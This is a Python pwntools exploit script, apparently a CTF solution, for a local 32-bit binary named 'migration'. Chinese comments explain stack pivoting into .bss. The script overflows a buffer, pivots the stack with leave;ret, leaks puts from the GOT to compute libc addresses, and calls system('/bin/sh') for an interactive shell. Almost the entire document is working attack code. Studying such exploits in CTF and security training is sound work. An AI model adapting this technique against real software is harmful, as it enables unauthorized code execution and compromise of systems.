# -*- coding:utf8 -*-
from pwn import *
'''
从题目来看，mian函数只能执行一次，那么ret2lib的操作就执行不了了，
然后就一个输入，read读取0x40个字节到buf0x28的空间中，会溢出0x12个字节，
那么可以用来构造的paylode长度就很有限了，
这个时候就要用到一种叫做构造假栈帧的操作了
  
  stack pivot / stack migration

原理是，通过溢出，去执行一次read函数，
把我们要接下来执行的rop链写到bss的某个地址里去
（可以根据用readelf 命令去查一下bss的哪个地方有执行的权力），
接着构造假的ebp，让ebp跳转到bss的某个地址中，
从而让计算机把那个地址当成栈帧，达到构造假栈帧的目的。

我们首先用ROPgadget去找找可以用的gadget：
'''

p = process('./migration')
elf = ELF('./migration')
libc = ELF('/lib32/libc.so.6')

system_libc = libc.symbols['system']
print "system_libc : " + hex(system_libc)

read_plt = elf.plt['read']
print "read_plt : " + hex(read_plt)

puts_got = elf.got['puts']
print "puts_got : " + hex(puts_got)

puts_plt = elf.plt['puts']
print "puts_plt : " + hex(puts_plt)

puts_libc = libc.symbols['puts']
print "puts_libc : " + hex(puts_libc)

binsh_libc = libc.search("/bin/sh").next()
print "binsh_libc : " + hex(binsh_libc)


#bss = 0x0804a00c
bss = elf.bss()
# 0x08048418 : leave ; ret #用于返回栈，改变ebp和esp的值
leave_ret=0x08048418
# 0x0804836d : pop ebx ; ret #p1ret 用于放参数 (参考系统调用)
pop_ebx= 0x0804836d
# 0x08048569 : pop esi ; pop edi ; pop ebp ; ret  
#  用于最后同时控制ebp和esp，进行ret操作直接执行system（/bin/sh）
pop_esi_edi_ebp= 0x08048569

buf1 = bss + 0x500
buf2 = bss + 0x400

print "bss : " + hex(bss)
print "buf1 : " + hex(buf1)
print "buf2 : " + hex(buf2)

payload = 'A' * 40
payload += p32(buf1)
payload += p32(read_plt)
payload += p32(leave_ret)
payload += p32(0)
payload += p32(buf1)
payload += p32(0x100)

p.recvuntil('Try your best :\n')
#p.sendline(payload) # 这里使用sendline拿不到shell！！！
p.send(payload)
sleep(0.1)

payload = p32(buf2)
payload += p32(puts_plt)
payload += p32(pop_ebx)
payload += p32(puts_got)
payload += p32(read_plt)
payload += p32(leave_ret)
payload += p32(0)
payload += p32(buf2)
payload += p32(0x100)
p.send(payload)
sleep(0.1)


puts_addr = u32(p.recv(4))
print "puts_addr : " + hex(puts_addr)

offset = puts_addr - puts_libc
system_addr = system_libc + offset
binsh = binsh_libc + offset


payload = p32(buf1) 
payload += p32(system_addr)
payload += "bbbb"
payload += p32(binsh)

p.send(payload)
sleep(0.1)

p.interactive()

